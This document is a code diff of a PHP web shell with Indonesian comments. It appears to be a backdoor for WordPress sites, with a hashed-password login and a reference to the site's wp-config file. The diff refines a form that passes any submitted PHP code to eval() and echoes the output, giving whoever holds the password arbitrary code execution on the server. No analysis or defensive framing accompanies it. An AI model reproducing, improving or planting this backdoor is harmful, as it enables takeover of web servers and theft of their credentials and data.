@@ -1,7 +1,9 @@
 <?php
 ini_set('log_errors', 0);
 
-session_start();
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
 
 // Hash password yang benar (gunakan hash yang dihasilkan dari password_hash)
 $hashed_pass = '$2y$10$3CIM2PJAvpbiYODK83geVu1cookk8Y8E8mm2H0RjT9JY3cCwLf1TK'; 
@@ -991,36 +993,25 @@ if ($wp_config_file) {
 
 
 
+<form method="post">
+    <label for="php_code">Eksekusi Kode PHP :</label><br>
+    <textarea name="php_code" rows="2" cols="50" placeholder="Masukkan kode PHP di sini..."></textarea><br>
+    <input type="submit" value="Jalankan php">
+</form>
 
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $php_code = $_POST['php_code'];
 
+    // Menangkap output dari eksekusi kode PHP yang dimasukkan
+    ob_start();
+    eval("?>$php_code");
+    $output = ob_get_clean();
 
-
-
-
-
-    <form method="post">
-	<label for="command"> Eksekusi Kode PHP :</label><br>
-        <textarea name="code" rows="2" cols="50" placeholder="Masukkan kode PHP di sini..."></textarea><br>
-	<input type="submit" value="Jalankan php">
-        
-    </form>
-
-
-
-   
-
-    
-
-
-    <?php
-    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-        $code = $_POST['code'];
-        
-        // Pastikan kode PHP aman untuk dieksekusi
-        // Hanya untuk tujuan demonstrasi. Hindari ini di lingkungan produksi.
-        eval("?>$code");
-    }
-    ?>
+    // Menampilkan hasil eksekusi
+    echo '<pre>' . htmlspecialchars($output) . '</pre>';
+}
+?>
 
 
 <?php
@@ -1126,6 +1117,10 @@ if (isset($_POST['submit'])) {
 }
 ?>
     </pre>
+
+
+
+
 
 
 
